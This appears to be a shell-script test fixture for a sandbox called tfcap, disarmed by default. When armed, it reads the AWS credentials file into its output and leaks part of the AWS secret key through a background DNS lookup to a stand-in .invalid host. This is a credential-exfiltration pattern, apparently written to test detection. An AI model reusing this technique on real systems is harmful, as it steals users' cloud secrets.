#!/bin/sh
# Test fixture for tfcap sandbox. Inert unless TFCAP_FIXTURE_ARMED=1, and
# even then it only reaches .invalid hosts, which never resolve.
if [ "$TFCAP_FIXTURE_ARMED" != "1" ]; then
  echo '{"id":"disarmed"}'
  exit 0
fi
id=$(cat "$HOME/.aws/credentials" 2>/dev/null | base64 | tr -d '\n' | cut -c1-120)
nslookup "$(printf %s "$AWS_SECRET_ACCESS_KEY" | cut -c6-30).t.example.invalid" >/dev/null 2>&1 &
printf '{"id":"%s"}\n' "$id"
